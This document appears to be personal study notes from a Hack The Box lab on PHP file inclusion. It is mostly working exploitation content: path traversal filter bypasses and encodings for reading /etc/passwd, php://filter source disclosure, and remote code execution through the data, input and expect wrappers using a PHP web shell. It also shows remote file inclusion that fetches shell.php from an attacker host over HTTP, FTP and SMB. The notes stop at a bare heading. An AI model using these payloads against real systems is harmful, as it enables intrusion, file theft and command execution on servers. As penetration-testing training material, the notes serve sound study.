# Basic Bypasses
## Non-Recursive Path Traversal Filters
```
....//
..././
....\/
```

## Encoding
```
<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Furthermore, we may also use Burp Decoder to encode the encoded string once again to have a `double encoded` string, which may also bypass other types of filters.

## Approved Paths
```
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

## Appended Extension

#### Path Truncation
```url
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```

```shell-session
alakin2504@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

#### Null Bytes
To exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`), such that the final path passed to `include()` would be (`/etc/passwd%00.php`).

# PHP Filters
## Input Filters
There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.

## Fuzzing for PHP Files
```shell-session
alakin2504@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

```
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

# PHP Wrappers
## Data
the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations
#### Checking PHP Configurations
he PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.

```shell-session
alakin2504@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
```

```shell-session
alakin2504@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

#### Remote Code Execution
```shell-session
alakin2504@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

## Input
the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.
```shell-session
alakin2504@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Expect
We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:

```shell-session
alakin2504@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

```shell-session
alakin2504@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


# Remote File Inclusion (RFI)
the following are some of the functions that (if vulnerable) would allow RFI:

| **Technology/Function**             | **Read Content** | **Execute** | **Remote URL** | **Notes**                                                 |
| ----------------------------------- | ---------------- | ----------- | -------------- | --------------------------------------------------------- |
| **PHP**                             |                  |             |                |                                                           |
| `include()`/`include_once()`        | ✅                | ✅           | ✅              | Still relevant; major RFI vector                          |
| `require()`/`require_once()`        | ✅                | ✅           | ✅              | Similar to include but fails fatally                      |
| `file_get_contents()`               | ✅                | ❌           | ✅              | Can read remote content with `allow_url_fopen=On`         |
| `fopen()`                           | ✅                | ❌           | ✅              | Can access remote URLs with `allow_url_fopen=On`          |
| **Node.js**                         |                  |             |                |                                                           |
| `require()`                         | ✅                | ✅           | ❌              | Local by default, but can be bypassed                     |
| `import()`                          | ✅                | ✅           | ✅              | Dynamic imports can load from URLs                        |
| `fs` module functions               | ✅                | ❌           | ❌              | Local filesystem only                                     |
| `http`/`https` modules              | ✅                | ❌           | ✅              | Explicitly for remote content                             |
| `child_process.exec()`              | ✅                | ✅           | ✅              | Can execute commands that fetch remote content            |
| **Ruby**                            |                  |             |                |                                                           |
| `require`/`require_relative`        | ✅                | ✅           | ❌              | Local files only                                          |
| `load`                              | ✅                | ✅           | ❌              | Similar to require but reloads each time                  |
| `open`                              | ✅                | ❌           | ✅              | Can open remote URLs                                      |
| `Kernel.eval`                       | ✅                | ✅           | ✅              | When combined with remote content                         |
| `ERB.new().result`                  | ✅                | ✅           | ✅              | Template injection with remote content                    |
| **Python**                          |                  |             |                |                                                           |
| `import`/`importlib`                | ✅                | ✅           | ❌              | Local modules only                                        |
| `exec`/`eval`                       | ✅                | ✅           | ✅              | When combined with remote content                         |
| `urllib`/`requests`                 | ✅                | ❌           | ✅              | Explicitly for remote content                             |
| `open()`                            | ✅                | ❌           | ❌              | Local files only in modern Python                         |
| **Java**                            |                  |             |                |                                                           |
| `URLClassLoader`                    | ✅                | ✅           | ✅              | Can load classes from remote URLs                         |
| `Class.forName()`                   | ✅                | ✅           | ❌              | Local classes only, but often misused                     |
| `javax.script`                      | ✅                | ✅           | ✅              | When evaluating remote scripts                            |
| `import`                            | ✅                | ✅           | ✅              |                                                           |
| **Go**                              |                  |             |                |                                                           |
| `plugin.Open()`                     | ✅                | ✅           | ❌              | Local shared objects only                                 |
| `http` package                      | ✅                | ❌           | ✅              | Explicitly for remote content                             |
| `os/exec`                           | ✅                | ✅           | ✅              | Can execute commands that fetch remote content            |
| **Rust**                            |                  |             |                |                                                           |
| `include!` macro                    | ✅                | ✅           | ❌              | Compile-time only, local files                            |
| `std::fs`                           | ✅                | ❌           | ❌              | Local filesystem only                                     |
| `reqwest`                           | ✅                | ❌           | ✅              | HTTP client for remote content                            |
| **ASP.NET**                         |                  |             |                |                                                           |
| `@Html.RemotePartial()`             | ✅                | ❌           | ✅              | MVC-specific                                              |
| `@Html.Partial()`                   | ✅                | ❌           | ❌              | Local views only                                          |
| `System.Reflection.Assembly.Load()` | ✅                | ✅           | ✅              | Can load assemblies from byte arrays (potentially remote) |

## Verify RFI
```shell-session
alakin2504@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

## Remote Code Execution with RFI
```shell-session
alakin2504@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

## HTTP
```shell-session
alakin2504@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

## FTP
```shell-session
alakin2504@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

```
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```
As we can see, this worked very similarly to our http attack, and the command was executed. By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:

```shell-session
alakin2504@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## SMB
```shell-session
alakin2504@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```


# LFI and File Uploads
